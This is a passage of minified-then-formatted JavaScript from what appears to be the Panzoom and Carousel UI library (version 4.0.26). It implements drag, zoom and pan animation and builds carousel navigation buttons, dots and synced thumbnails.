                              "x" === t.lockAxis) ||
                              (t.dragPosition.y =
                                t.dragStart.y + t.dragOffset.y),
                            (t.dragPosition.scale =
                              t.dragStart.scale * t.dragOffset.scale),
                            n.length > 1)
                          ) {
                            var v = T(e.startPointers[0], e.startPointers[1]),
                              p = v.clientX - t.dragStart.rect.x,
                              g = v.clientY - t.dragStart.rect.y,
                              m = t.getZoomDelta(
                                t.content.scale * t.dragOffset.scale,
                                p,
                                g
                              ),
                              y = m.deltaX,
                              b = m.deltaY;
                            (t.dragPosition.x -= y),
                              (t.dragPosition.y -= b),
                              (t.dragPosition.midPoint = s);
                          } else t.setDragResistance();
                          (t.transform = {
                            x: t.dragPosition.x,
                            y: t.dragPosition.y,
                            scale: t.dragPosition.scale,
                          }),
                            t.startAnimation();
                        }
                      }
                    } else o.preventDefault();
                },
                end: function (n, o) {
                  if ("pointerdown" === t.state)
                    if (
                      ((t._dragOffset = i({}, t.dragOffset)),
                      e.currentPointers.length)
                    )
                      t.resetDragPosition();
                    else if (
                      ((t.state = "decel"),
                      (t.friction = t.option("decelFriction")),
                      t.recalculateTransform(),
                      t.$container.classList.remove(t.option("draggingClass")),
                      !1 !== t.trigger("touchEnd", o) && "decel" === t.state)
                    ) {
                      var a = t.option("minScale");
                      if (t.transform.scale < a)
                        t.zoomTo(a, { friction: 0.64 });
                      else {
                        var s = t.option("maxScale");
                        if (t.transform.scale - s > 0.01) {
                          var r = t.dragPosition.midPoint || n,
                            l = t.$content.getClientRects()[0];
                          t.zoomTo(s, {
                            friction: 0.64,
                            x: r.clientX - l.left,
                            y: r.clientY - l.top,
                          });
                        } else;
                      }
                    }
                },
              });
              this.pointerTracker = e;
            },
          },
          {
            key: "initObserver",
            value: function () {
              var t = this;
              this.resizeObserver ||
                ((this.resizeObserver = new $(function () {
                  t.updateTimer ||
                    (t.updateTimer = setTimeout(function () {
                      var e = t.$container.getBoundingClientRect();
                      e.width && e.height
                        ? ((Math.abs(e.width - t.container.width) > 1 ||
                            Math.abs(e.height - t.container.height) > 1) &&
                            (t.isAnimating() && t.endAnimation(!0),
                            t.updateMetrics(),
                            t.panTo({
                              x: t.content.x,
                              y: t.content.y,
                              scale: t.option("baseScale"),
                              friction: 0,
                            })),
                          (t.updateTimer = null))
                        : (t.updateTimer = null);
                    }, t.updateRate));
                })),
                this.resizeObserver.observe(this.$container));
            },
          },
          {
            key: "resetDragPosition",
            value: function () {
              (this.lockAxis = null),
                (this.friction = this.option("friction")),
                (this.velocity = { x: 0, y: 0, scale: 0 });
              var t = this.content,
                e = t.x,
                n = t.y,
                o = t.scale;
              (this.dragStart = {
                rect: this.$content.getBoundingClientRect(),
                x: e,
                y: n,
                scale: o,
              }),
                (this.dragPosition = i(
                  i({}, this.dragPosition),
                  {},
                  { x: e, y: n, scale: o }
                )),
                (this.dragOffset = { x: 0, y: 0, scale: 1, time: 0 });
            },
          },
          {
            key: "updateMetrics",
            value: function (t) {
              !0 !== t && this.trigger("beforeUpdate");
              var e,
                n = this.$container,
                o = this.$content,
                a = this.$viewport,
                s = o instanceof HTMLImageElement,
                r = this.option("zoom"),
                l = this.option("resizeParent", r),
                c = this.option("width"),
                h = this.option("height"),
                d =
                  c ||
                  ((e = o),
                  Math.max(
                    parseFloat(e.naturalWidth || 0),
                    parseFloat(
                      (e.width && e.width.baseVal && e.width.baseVal.value) || 0
                    ),
                    parseFloat(e.offsetWidth || 0),
                    parseFloat(e.scrollWidth || 0)
                  )),
                u =
                  h ||
                  (function (t) {
                    return Math.max(
                      parseFloat(t.naturalHeight || 0),
                      parseFloat(
                        (t.height &&
                          t.height.baseVal &&
                          t.height.baseVal.value) ||
                          0
                      ),
                      parseFloat(t.offsetHeight || 0),
                      parseFloat(t.scrollHeight || 0)
                    );
                  })(o);
              Object.assign(o.style, {
                width: c ? "".concat(c, "px") : "",
                height: h ? "".concat(h, "px") : "",
                maxWidth: "",
                maxHeight: "",
              }),
                l && Object.assign(a.style, { width: "", height: "" });
              var f = this.option("ratio");
              (c = d = S(d * f)), (h = u = S(u * f));
              var v = o.getBoundingClientRect(),
                p = a.getBoundingClientRect(),
                g = a == n ? p : n.getBoundingClientRect(),
                m = Math.max(a.offsetWidth, S(p.width)),
                y = Math.max(a.offsetHeight, S(p.height)),
                b = window.getComputedStyle(a);
              if (
                ((m -= parseFloat(b.paddingLeft) + parseFloat(b.paddingRight)),
                (y -= parseFloat(b.paddingTop) + parseFloat(b.paddingBottom)),
                (this.viewport.width = m),
                (this.viewport.height = y),
                r)
              ) {
                if (
                  Math.abs(d - v.width) > 0.1 ||
                  Math.abs(u - v.height) > 0.1
                ) {
                  var x = (function (t, e, i, n) {
                    var o = Math.min(i / t || 0, n / e);
                    return { width: t * o || 0, height: e * o || 0 };
                  })(d, u, Math.min(d, v.width), Math.min(u, v.height));
                  (c = S(x.width)), (h = S(x.height));
                }
                Object.assign(o.style, {
                  width: "".concat(c, "px"),
                  height: "".concat(h, "px"),
                  transform: "",
                });
              }
              if (
                (l &&
                  (Object.assign(a.style, {
                    width: "".concat(c, "px"),
                    height: "".concat(h, "px"),
                  }),
                  (this.viewport = i(
                    i({}, this.viewport),
                    {},
                    { width: c, height: h }
                  ))),
                s && r && "function" != typeof this.options.maxScale)
              ) {
                var w = this.option("maxScale");
                this.options.maxScale = function () {
                  return this.content.origWidth > 0 && this.content.fitWidth > 0
                    ? this.content.origWidth / this.content.fitWidth
                    : w;
                };
              }
              (this.content = i(
                i({}, this.content),
                {},
                {
                  origWidth: d,
                  origHeight: u,
                  fitWidth: c,
                  fitHeight: h,
                  width: c,
                  height: h,
                  scale: 1,
                  isZoomable: r,
                }
              )),
                (this.container = { width: g.width, height: g.height }),
                !0 !== t && this.trigger("afterUpdate");
            },
          },
          {
            key: "zoomIn",
            value: function (t) {
              this.zoomTo(this.content.scale + (t || this.option("step")));
            },
          },
          {
            key: "zoomOut",
            value: function (t) {
              this.zoomTo(this.content.scale - (t || this.option("step")));
            },
          },
          {
            key: "toggleZoom",
            value: function () {
              var t =
                  arguments.length > 0 && void 0 !== arguments[0]
                    ? arguments[0]
                    : {},
                e = this.option("maxScale"),
                i = this.option("baseScale"),
                n = this.content.scale > i + 0.5 * (e - i) ? i : e;
              this.zoomTo(n, t);
            },
          },
          {
            key: "zoomTo",
            value: function () {
              var t =
                  arguments.length > 0 && void 0 !== arguments[0]
                    ? arguments[0]
                    : this.option("baseScale"),
                e =
                  arguments.length > 1 && void 0 !== arguments[1]
                    ? arguments[1]
                    : {},
                i = e.x,
                n = void 0 === i ? null : i,
                o = e.y,
                a = void 0 === o ? null : o;
              t = Math.max(
                Math.min(t, this.option("maxScale")),
                this.option("minScale")
              );
              var s = S(
                this.content.scale /
                  (this.content.width / this.content.fitWidth),
                1e7
              );
              null === n && (n = this.content.width * s * 0.5),
                null === a && (a = this.content.height * s * 0.5);
              var r = this.getZoomDelta(t, n, a),
                l = r.deltaX,
                c = r.deltaY;
              (n = this.content.x - l),
                (a = this.content.y - c),
                this.panTo({
                  x: n,
                  y: a,
                  scale: t,
                  friction: this.option("zoomFriction"),
                });
            },
          },
          {
            key: "getZoomDelta",
            value: function (t) {
              var e =
                  arguments.length > 1 && void 0 !== arguments[1]
                    ? arguments[1]
                    : 0,
                i =
                  arguments.length > 2 && void 0 !== arguments[2]
                    ? arguments[2]
                    : 0,
                n = this.content.fitWidth * this.content.scale,
                o = this.content.fitHeight * this.content.scale,
                a = e > 0 && n ? e / n : 0,
                s = i > 0 && o ? i / o : 0,
                r = this.content.fitWidth * t,
                l = this.content.fitHeight * t,
                c = (r - n) * a,
                h = (l - o) * s;
              return { deltaX: c, deltaY: h };
            },
          },
          {
            key: "panTo",
            value: function () {
              var t =
                  arguments.length > 0 && void 0 !== arguments[0]
                    ? arguments[0]
                    : {},
                e = t.x,
                n = void 0 === e ? this.content.x : e,
                o = t.y,
                a = void 0 === o ? this.content.y : o,
                s = t.scale,
                r = t.friction,
                l = void 0 === r ? this.option("friction") : r,
                c = t.ignoreBounds,
                h = void 0 !== c && c;
              if (((s = s || this.content.scale || 1), !h)) {
                var d = this.getBounds(s),
                  u = d.boundX,
                  f = d.boundY;
                u && (n = Math.max(Math.min(n, u.to), u.from)),
                  f && (a = Math.max(Math.min(a, f.to), f.from));
              }
              (this.friction = l),
                (this.transform = i(
                  i({}, this.transform),
                  {},
                  { x: n, y: a, scale: s }
                )),
                l
                  ? ((this.state = "panning"),
                    (this.velocity = {
                      x: (1 / this.friction - 1) * (n - this.content.x),
                      y: (1 / this.friction - 1) * (a - this.content.y),
                      scale: (1 / this.friction - 1) * (s - this.content.scale),
                    }),
                    this.startAnimation())
                  : this.endAnimation();
            },
          },
          {
            key: "startAnimation",
            value: function () {
              var t = this;
              this.rAF
                ? cancelAnimationFrame(this.rAF)
                : this.trigger("startAnimation"),
                (this.rAF = requestAnimationFrame(function () {
                  return t.animate();
                }));
            },
          },
          {
            key: "animate",
            value: function () {
              var t = this;
              if (
                (this.setEdgeForce(),
                this.setDragForce(),
                (this.velocity.x *= this.friction),
                (this.velocity.y *= this.friction),
                (this.velocity.scale *= this.friction),
                (this.content.x += this.velocity.x),
                (this.content.y += this.velocity.y),
                (this.content.scale += this.velocity.scale),
                this.isAnimating())
              )
                this.setTransform();
              else if ("pointerdown" !== this.state)
                return void this.endAnimation();
              this.rAF = requestAnimationFrame(function () {
                return t.animate();
              });
            },
          },
          {
            key: "getBounds",
            value: function (t) {
              var e = this.boundX,
                i = this.boundY;
              if (void 0 !== e && void 0 !== i) return { boundX: e, boundY: i };
              (e = { from: 0, to: 0 }),
                (i = { from: 0, to: 0 }),
                (t = t || this.transform.scale);
              var n = this.content.fitWidth * t,
                o = this.content.fitHeight * t,
                a = this.viewport.width,
                s = this.viewport.height;
              if (n < a) {
                var r = S(0.5 * (a - n));
                (e.from = r), (e.to = r);
              } else e.from = S(a - n);
              if (o < s) {
                var l = 0.5 * (s - o);
                (i.from = l), (i.to = l);
              } else i.from = S(s - o);
              return { boundX: e, boundY: i };
            },
          },
          {
            key: "setEdgeForce",
            value: function () {
              if ("decel" === this.state) {
                var t,
                  e,
                  i,
                  n,
                  o = this.option("bounceForce"),
                  a = this.getBounds(
                    Math.max(this.transform.scale, this.content.scale)
                  ),
                  s = a.boundX,
                  r = a.boundY;
                if (
                  (s &&
                    ((t = this.content.x < s.from),
                    (e = this.content.x > s.to)),
                  r &&
                    ((i = this.content.y < r.from),
                    (n = this.content.y > r.to)),
                  t || e)
                ) {
                  var l = ((t ? s.from : s.to) - this.content.x) * o,
                    c = this.content.x + (this.velocity.x + l) / this.friction;
                  c >= s.from && c <= s.to && (l += this.velocity.x),
                    (this.velocity.x = l),
                    this.recalculateTransform();
                }
                if (i || n) {
                  var h = ((i ? r.from : r.to) - this.content.y) * o,
                    d = this.content.y + (h + this.velocity.y) / this.friction;
                  d >= r.from && d <= r.to && (h += this.velocity.y),
                    (this.velocity.y = h),
                    this.recalculateTransform();
                }
              }
            },
          },
          {
            key: "setDragResistance",
            value: function () {
              if ("pointerdown" === this.state) {
                var t,
                  e,
                  i,
                  n,
                  o = this.getBounds(this.dragPosition.scale),
                  a = o.boundX,
                  s = o.boundY;
                if (
                  (a &&
                    ((t = this.dragPosition.x < a.from),
                    (e = this.dragPosition.x > a.to)),
                  s &&
                    ((i = this.dragPosition.y < s.from),
                    (n = this.dragPosition.y > s.to)),
                  (t || e) && (!t || !e))
                ) {
                  var r = t ? a.from : a.to,
                    l = r - this.dragPosition.x;
                  this.dragPosition.x = r - 0.3 * l;
                }
                if ((i || n) && (!i || !n)) {
                  var c = i ? s.from : s.to,
                    h = c - this.dragPosition.y;
                  this.dragPosition.y = c - 0.3 * h;
                }
              }
            },
          },
          {
            key: "setDragForce",
            value: function () {
              "pointerdown" === this.state &&
                ((this.velocity.x = this.dragPosition.x - this.content.x),
                (this.velocity.y = this.dragPosition.y - this.content.y),
                (this.velocity.scale =
                  this.dragPosition.scale - this.content.scale));
            },
          },
          {
            key: "recalculateTransform",
            value: function () {
              (this.transform.x =
                this.content.x + this.velocity.x / (1 / this.friction - 1)),
                (this.transform.y =
                  this.content.y + this.velocity.y / (1 / this.friction - 1)),
                (this.transform.scale =
                  this.content.scale +
                  this.velocity.scale / (1 / this.friction - 1));
            },
          },
          {
            key: "isAnimating",
            value: function () {
              return !(
                !this.friction ||
                !(
                  Math.abs(this.velocity.x) > 0.05 ||
                  Math.abs(this.velocity.y) > 0.05 ||
                  Math.abs(this.velocity.scale) > 0.05
                )
              );
            },
          },
          {
            key: "setTransform",
            value: function (t) {
              var e, n, o, a, s;
              (t
                ? ((e = S(this.transform.x)),
                  (n = S(this.transform.y)),
                  (o = this.transform.scale),
                  (this.content = i(
                    i({}, this.content),
                    {},
                    { x: e, y: n, scale: o }
                  )))
                : ((e = S(this.content.x)),
                  (n = S(this.content.y)),
                  (o =
                    this.content.scale /
                    (this.content.width / this.content.fitWidth)),
                  (this.content = i(i({}, this.content), {}, { x: e, y: n }))),
              this.trigger("beforeTransform"),
              (e = S(this.content.x)),
              (n = S(this.content.y)),
              t && this.option("zoom"))
                ? ((a = S(this.content.fitWidth * o)),
                  (s = S(this.content.fitHeight * o)),
                  (this.content.width = a),
                  (this.content.height = s),
                  (this.transform = i(
                    i({}, this.transform),
                    {},
                    { width: a, height: s, scale: o }
                  )),
                  Object.assign(this.$content.style, {
                    width: "".concat(a, "px"),
                    height: "".concat(s, "px"),
                    maxWidth: "none",
                    maxHeight: "none",
                    transform: "translate3d("
                      .concat(e, "px, ")
                      .concat(n, "px, 0) scale(1)"),
                  }))
                : (this.$content.style.transform = "translate3d("
                    .concat(e, "px, ")
                    .concat(n, "px, 0) scale(")
                    .concat(o, ")"));
              this.trigger("afterTransform");
            },
          },
          {
            key: "endAnimation",
            value: function (t) {
              cancelAnimationFrame(this.rAF),
                (this.rAF = null),
                (this.velocity = { x: 0, y: 0, scale: 0 }),
                this.setTransform(!0),
                (this.state = "ready"),
                this.handleCursor(),
                !0 !== t && this.trigger("endAnimation");
            },
          },
          {
            key: "handleCursor",
            value: function () {
              var t = this.option("draggableClass");
              t &&
                this.option("touch") &&
                (1 == this.option("panOnlyZoomed") &&
                this.content.width <= this.viewport.width &&
                this.content.height <= this.viewport.height &&
                this.transform.scale <= this.option("baseScale")
                  ? this.$container.classList.remove(t)
                  : this.$container.classList.add(t));
            },
          },
          {
            key: "detachEvents",
            value: function () {
              this.$content.removeEventListener("load", this.onLoad),
                this.$container.removeEventListener("wheel", this.onWheel, {
                  passive: !1,
                }),
                this.$container.removeEventListener("click", this.onClick, {
                  passive: !1,
                }),
                this.pointerTracker &&
                  (this.pointerTracker.stop(), (this.pointerTracker = null)),
                this.resizeObserver &&
                  (this.resizeObserver.disconnect(),
                  (this.resizeObserver = null));
            },
          },
          {
            key: "destroy",
            value: function () {
              "destroy" !== this.state &&
                ((this.state = "destroy"),
                clearTimeout(this.updateTimer),
                (this.updateTimer = null),
                cancelAnimationFrame(this.rAF),
                (this.rAF = null),
                this.detachEvents(),
                this.detachPlugins(),
                this.resetDragPosition());
            },
          },
        ]),
        n
      );
    })(O);
  (M.version = "4.0.26"), (M.Plugins = {});
  var I = function (t, e) {
      var i = 0;
      return function () {
        var n = new Date().getTime();
        if (!(n - i < e)) return (i = n), t.apply(void 0, arguments);
      };
    },
    F = (function () {
      function t(e) {
        o(this, t),
          (this.$container = null),
          (this.$prev = null),
          (this.$next = null),
          (this.carousel = e),
          (this.onRefresh = this.onRefresh.bind(this));
      }
      return (
        s(t, [
          {
            key: "option",
            value: function (t) {
              return this.carousel.option("Navigation.".concat(t));
            },
          },
          {
            key: "createButton",
            value: function (t) {
              var e,
                i = this,
                n = document.createElement("button");
              n.setAttribute(
                "title",
                this.carousel.localize("{{".concat(t.toUpperCase(), "}}"))
              );
              var o =
                this.option("classNames.button") +
                " " +
                this.option("classNames.".concat(t));
              return (
                (e = n.classList).add.apply(e, m(o.split(" "))),
                n.setAttribute("tabindex", "0"),
                (n.innerHTML = this.carousel.localize(
                  this.option("".concat(t, "Tpl"))
                )),
                n.addEventListener("click", function (e) {
                  e.preventDefault(),
                    e.stopPropagation(),
                    i.carousel[
                      "slide".concat("next" === t ? "Next" : "Prev")
                    ]();
                }),
                n
              );
            },
          },
          {
            key: "build",
            value: function () {
              var t;
              this.$container ||
                ((this.$container = document.createElement("div")),
                (t = this.$container.classList).add.apply(
                  t,
                  m(this.option("classNames.main").split(" "))
                ),
                this.carousel.$container.appendChild(this.$container));
              this.$next ||
                ((this.$next = this.createButton("next")),
                this.$container.appendChild(this.$next)),
                this.$prev ||
                  ((this.$prev = this.createButton("prev")),
                  this.$container.appendChild(this.$prev));
            },
          },
          {
            key: "onRefresh",
            value: function () {
              var t = this.carousel.pages.length;
              t <= 1 ||
              (t > 1 &&
                this.carousel.elemDimWidth < this.carousel.wrapDimWidth &&
                !Number.isInteger(this.carousel.option("slidesPerPage")))
                ? this.cleanup()
                : (this.build(),
                  this.$prev.removeAttribute("disabled"),
                  this.$next.removeAttribute("disabled"),
                  this.carousel.option(
                    "infiniteX",
                    this.carousel.option("infinite")
                  ) ||
                    (this.carousel.page <= 0 &&
                      this.$prev.setAttribute("disabled", ""),
                    this.carousel.page >= t - 1 &&
                      this.$next.setAttribute("disabled", "")));
            },
          },
          {
            key: "cleanup",
            value: function () {
              this.$prev && this.$prev.remove(),
                (this.$prev = null),
                this.$next && this.$next.remove(),
                (this.$next = null),
                this.$container && this.$container.remove(),
                (this.$container = null);
            },
          },
          {
            key: "attach",
            value: function () {
              this.carousel.on("refresh change", this.onRefresh);
            },
          },
          {
            key: "detach",
            value: function () {
              this.carousel.off("refresh change", this.onRefresh),
                this.cleanup();
            },
          },
        ]),
        t
      );
    })();
  F.defaults = {
    prevTpl:
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" tabindex="-1"><path d="M15 3l-9 9 9 9"/></svg>',
    nextTpl:
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" tabindex="-1"><path d="M9 3l9 9-9 9"/></svg>',
    classNames: {
      main: "carousel__nav",
      button: "carousel__button",
      next: "is-next",
      prev: "is-prev",
    },
  };
  var R = (function () {
      function t(e) {
        o(this, t),
          (this.carousel = e),
          (this.$list = null),
          (this.events = {
            change: this.onChange.bind(this),
            refresh: this.onRefresh.bind(this),
          });
      }
      return (
        s(t, [
          {
            key: "buildList",
            value: function () {
              var t = this;
              if (
                !(
                  this.carousel.pages.length <
                  this.carousel.option("Dots.minSlideCount")
                )
              ) {
                var e = document.createElement("ol");
                return (
                  e.classList.add("carousel__dots"),
                  e.addEventListener("click", function (e) {
                    if ("page" in e.target.dataset) {
                      e.preventDefault(), e.stopPropagation();
                      var i = parseInt(e.target.dataset.page, 10),
                        n = t.carousel;
                      i !== n.page &&
                        (n.pages.length < 3 && n.option("infinite")
                          ? n[0 == i ? "slidePrev" : "slideNext"]()
                          : n.slideTo(i));
                    }
                  }),
                  (this.$list = e),
                  this.carousel.$container.appendChild(e),
                  this.carousel.$container.classList.add("has-dots"),
                  e
                );
              }
            },
          },
          {
            key: "removeList",
            value: function () {
              this.$list &&
                (this.$list.parentNode.removeChild(this.$list),
                (this.$list = null)),
                this.carousel.$container.classList.remove("has-dots");
            },
          },
          {
            key: "rebuildDots",
            value: function () {
              var t = this,
                e = this.$list,
                i = !!e,
                n = this.carousel.pages.length;
              if (n < 2) i && this.removeList();
              else {
                i || (e = this.buildList());
                var o = this.$list.children.length;
                if (o > n)
                  for (var a = n; a < o; a++)
                    this.$list.removeChild(this.$list.lastChild);
                else {
                  for (
                    var s = function (e) {
                        var i = document.createElement("li");
                        i.classList.add("carousel__dot"),
                          (i.dataset.page = e),
                          i.setAttribute("role", "button"),
                          i.setAttribute("tabindex", "0"),
                          i.setAttribute(
                            "title",
                            t.carousel.localize("{{GOTO}}", [["%d", e + 1]])
                          ),
                          i.addEventListener("keydown", function (t) {
                            var e,
                              n = t.code;
                            "Enter" === n || "NumpadEnter" === n
                              ? (e = i)
                              : "ArrowRight" === n
                              ? (e = i.nextSibling)
                              : "ArrowLeft" === n && (e = i.previousSibling),
                              e && e.click();
                          }),
                          t.$list.appendChild(i);
                      },
                      r = o;
                    r < n;
                    r++
                  )
                    s(r);
                  this.setActiveDot();
                }
              }
            },
          },
          {
            key: "setActiveDot",
            value: function () {
              if (this.$list) {
                this.$list.childNodes.forEach(function (t) {
                  t.classList.remove("is-selected");
                });
                var t = this.$list.childNodes[this.carousel.page];
                t && t.classList.add("is-selected");
              }
            },
          },
          {
            key: "onChange",
            value: function () {
              this.setActiveDot();
            },
          },
          {
            key: "onRefresh",
            value: function () {
              this.rebuildDots();
            },
          },
          {
            key: "attach",
            value: function () {
              this.carousel.on(this.events);
            },
          },
          {
            key: "detach",
            value: function () {
              this.removeList(),
                this.carousel.off(this.events),
                (this.carousel = null);
            },
          },
        ]),
        t
      );
    })(),
    N = (function () {
      function t(e) {
        o(this, t),
          (this.carousel = e),
          (this.selectedIndex = null),
          (this.friction = 0),
          (this.onNavReady = this.onNavReady.bind(this)),
          (this.onNavClick = this.onNavClick.bind(this)),
          (this.onNavCreateSlide = this.onNavCreateSlide.bind(this)),
          (this.onTargetChange = this.onTargetChange.bind(this));
      }
      return (
        s(t, [
          {
            key: "addAsTargetFor",
            value: function (t) {
              (this.target = this.carousel),
                (this.nav = t),
                this.attachEvents();
            },
          },
          {
            key: "addAsNavFor",
            value: function (t) {
              (this.target = t),
                (this.nav = this.carousel),
                this.attachEvents();
            },
          },
          {
            key: "attachEvents",
            value: function () {
              (this.nav.options.initialSlide = this.target.options.initialPage),
                this.nav.on("ready", this.onNavReady),
                this.nav.on("createSlide", this.onNavCreateSlide),
                this.nav.on("Panzoom.click", this.onNavClick),
                this.target.on("change", this.onTargetChange),
                this.target.on("Panzoom.afterUpdate", this.onTargetChange);
            },
          },
          {
            key: "onNavReady",
            value: function () {
              this.onTargetChange(!0);
            },
          },
          {
            key: "onNavClick",
            value: function (t, e, i) {
              var n = i.target.closest(".carousel__slide");
              if (n) {
                i.stopPropagation();
                var o = parseInt(n.dataset.index, 10),
                  a = this.target.findPageForSlide(o);
                this.target.page !== a &&
                  this.target.slideTo(a, { friction: this.friction }),
                  this.markSelectedSlide(o);
              }
            },
          },
          {
            key: "onNavCreateSlide",
            value: function (t, e) {
              e.index === this.selectedIndex && this.markSelectedSlide(e.index);
            },
          },
          {
            key: "onTargetChange",
            value: function () {
              var t = this.target.pages[this.target.page].indexes[0],
                e = this.nav.findPageForSlide(t);
              this.nav.slideTo(e), this.markSelectedSlide(t);
            },
          },
          {
            key: "markSelectedSlide",
            value: function (t) {
              (this.selectedIndex = t),
                m(this.nav.slides).filter(function (t) {
                  return t.$el && t.$el.classList.remove("is-nav-selected");
                });
              var e = this.nav.slides[t];
              e && e.$el && e.$el.classList.add("is-nav-selected");
            },
          },
          {
            key: "attach",
            value: function (t) {
              var e = t.options.Sync;
              (e.target || e.nav) &&
                (e.target
                  ? this.addAsNavFor(e.target)
                  : e.nav && this.addAsTargetFor(e.nav),
                (this.friction = e.friction));
            },
          },
          {
            key: "detach",
            value: function () {
              this.nav &&
                (this.nav.off("ready", this.onNavReady),
                this.nav.off("Panzoom.click", this.onNavClick),
                this.nav.off("createSlide", this.onNavCreateSlide)),
                this.target &&
                  (this.target.off("Panzoom.afterUpdate", this.onTargetChange),
                  this.target.off("change", this.onTargetChange));
            },
          },
        ]),
        t
      );
    })();
  N.defaults = { friction: 0.92 };
  var D = { Navigation: F, Dots: R, Sync: N },
    B = {
      slides: [],
      preload: 0,
      slidesPerPage: "auto",
      initialPage: null,
      initialSlide: null,
      friction: 0.92,
      center: !0,
      infinite: !0,
      fill: !0,
      dragFree: !1,
      prefix: "",
      classNames: {
        viewport: "carousel__viewport",
        track: "carousel__track",
        slide: "carousel__slide",
        slideSelected: "is-selected",
      },
      l10n: {
        NEXT: "Next slide",
        PREV: "Previous slide",
        GOTO: "Go to slide #%d",
      },
    },
    W = (function (t) {
      l(n, t);
      var e = f(n);
      function n(t) {
        var i,
          a =
            arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
        if (
          (o(this, n),
          (a = k(!0, {}, B, a)),
          ((i = e.call(this, a)).state = "init"),
          (i.$container = t),
          !(i.$container instanceof HTMLElement))
        )
          throw new Error("No root element provided");
        return (
          (i.slideNext = I(i.slideNext.bind(d(i)), 250)),
          (i.slidePrev = I(i.slidePrev.bind(d(i)), 250)),
          i.init(),
          (t.__Carousel = d(i)),
          i
        );
      }
      return (
        s(n, [
          {
            key: "init",
            value: function () {
              (this.pages = []),
                (this.page = this.pageIndex = null),
                (this.prevPage = this.prevPageIndex = null),
                this.attachPlugins(n.Plugins),
                this.trigger("init"),
                this.initLayout(),
                this.initSlides(),
                this.updateMetrics(),
                this.$track &&
                  this.pages.length &&
                  (this.$track.style.transform = "translate3d(".concat(
                    -1 * this.pages[this.page].left,
                    "px, 0px, 0) scale(1)"
                  )),
                this.manageSlideVisiblity(),
                this.initPanzoom(),
                (this.state = "ready"),
                this.trigger("ready");
            },
          },
          {
            key: "initLayout",
            value: function () {
              var t,
                e,
                i,
                n,
                o = this.option("prefix"),
                a = this.option("classNames");
              ((this.$viewport =
                this.option("viewport") ||
                this.$container.querySelector(
                  ".".concat(o).concat(a.viewport)
                )),
              this.$viewport) ||
                ((this.$viewport = document.createElement("div")),
                (t = this.$viewport.classList).add.apply(
                  t,
                  m((o + a.viewport).split(" "))
                ),
                (e = this.$viewport).append.apply(
                  e,
                  m(this.$container.childNodes)
                ),
                this.$container.appendChild(this.$viewport));
              ((this.$track =
                this.option("track") ||
                this.$container.querySelector(".".concat(o).concat(a.track))),
              this.$track) ||
                ((this.$track = document.createElement("div")),
                (i = this.$track.classList).add.apply(
                  i,
                  m((o + a.track).split(" "))
                ),
                (n = this.$track).append.apply(n, m(this.$viewport.childNodes)),
                this.$viewport.appendChild(this.$track));
            },
          },
          {
            key: "initSlides",
            value: function () {
              var t = this;
              (this.slides = []),
                this.$viewport
                  .querySelectorAll(
                    "."
                      .concat(this.option("prefix"))
                      .concat(this.option("classNames.slide"))
                  )
                  .forEach(function (e) {
                    var i = { $el: e, isDom: !0 };
                    t.slides.push(i),
                      t.trigger("createSlide", i, t.slides.length);
                  }),
                Array.isArray(this.options.slides) &&
                  (this.slides = k(!0, m(this.slides), this.options.slides));
            },
          },
          {
            key: "updateMetrics",
            value: function () {
              var t,
                e = this,
                n = 0,
                o = [];
              this.slides.forEach(function (i, a) {
                var s = i.$el,
                  r = i.isDom || !t ? e.getSlideMetrics(s) : t;
                (i.index = a),
                  (i.width = r),
                  (i.left = n),
                  (t = r),
                  (n += r),
                  o.push(a);
              });
              var a = Math.max(
                  this.$track.offsetWidth,
                  S(this.$track.getBoundingClientRect().width)
                ),
                s = getComputedStyle(this.$track);
              (a -= parseFloat(s.paddingLeft) + parseFloat(s.paddingRight)),
                (this.contentWidth = n),
                (this.viewportWidth = a);
              var r = [],
                l = this.option("slidesPerPage");
              if (Number.isInteger(l) && n > a)
                for (var c = 0; c < this.slides.length; c += l)
                  r.push({
                    indexes: o.slice(c, c + l),
                    slides: this.slides.slice(c, c + l),
                  });
              else
                for (var h = 0, d = 0, u = 0; u < this.slides.length; u += 1) {
                  var f = this.slides[u];
                  (!r.length || d + f.width > a) &&
                    (r.push({ indexes: [], slides: [] }),
                    (h = r.length - 1),
                    (d = 0)),
                    (d += f.width),
                    r[h].indexes.push(u),
                    r[h].slides.push(f);
                }
              var v = this.option("center"),
                p = this.option("fill");
              r.forEach(function (t, i) {
                (t.index = i),
                  (t.width = t.slides.reduce(function (t, e) {
                    return t + e.width;
                  }, 0)),
                  (t.left = t.slides[0].left),
                  v && (t.left += 0.5 * (a - t.width) * -1),
                  p &&
                    !e.option("infiniteX", e.option("infinite")) &&
                    n > a &&
                    ((t.left = Math.max(t.left, 0)),
                    (t.left = Math.min(t.left, n - a)));
              });
              var g,
                y = [];
              r.forEach(function (t) {
                var e = i({}, t);
                g && e.left === g.left
                  ? ((g.width += e.width),
                    (g.slides = [].concat(m(g.slides), m(e.slides))),
                    (g.indexes = [].concat(m(g.indexes), m(e.indexes))))
                  : ((e.index = y.length), (g = e), y.push(e));
              }),
                (this.pages = y);
              var b = this.page;
              if (null === b) {
                var x = this.option("initialSlide");
                (b =
                  null !== x
                    ? this.findPageForSlide(x)
                    : parseInt(this.option("initialPage", 0), 10) || 0),
                  y[b] ||
                    (b = y.length && b > y.length ? y[y.length - 1].index : 0),
                  (this.page = b),
                  (this.pageIndex = b);
              }
              this.updatePanzoom(), this.trigger("refresh");
            },
          },
          {
            key: "getSlideMetrics",
            value: function (t) {
              if (!t) {
                var e,
                  i,
                  n = this.slides[0];
                if (
                  (((t = document.createElement("div")).dataset.isTestEl = 1),
                  (t.style.visibility = "hidden"),
                  (e = t.classList).add.apply(
                    e,
                    m(
                      (
                        this.option("prefix") + this.option("classNames.slide")
                      ).split(" ")
                    )
                  ),
                  n.customClass)
                )
                  (i = t.classList).add.apply(i, m(n.customClass.split(" ")));
                this.$track.prepend(t);
              }
              var o = Math.max(
                  t.offsetWidth,
                  S(t.getBoundingClientRect().width)
                ),
                a = t.currentStyle || window.getComputedStyle(t);
              return (
                (o =
                  o +
                  (parseFloat(a.marginLeft) || 0) +
                  (parseFloat(a.marginRight) || 0)),
                t.dataset.isTestEl && t.remove(),
                o
              );
            },
          },
          {
            key: "findPageForSlide",
            value: function (t) {
              t = parseInt(t, 10) || 0;
              var e = this.pages.find(function (e) {
                return e.indexes.indexOf(t) > -1;
              });
              return e ? e.index : null;
            },
          },
          {
            key: "slideNext",
            value: function () {
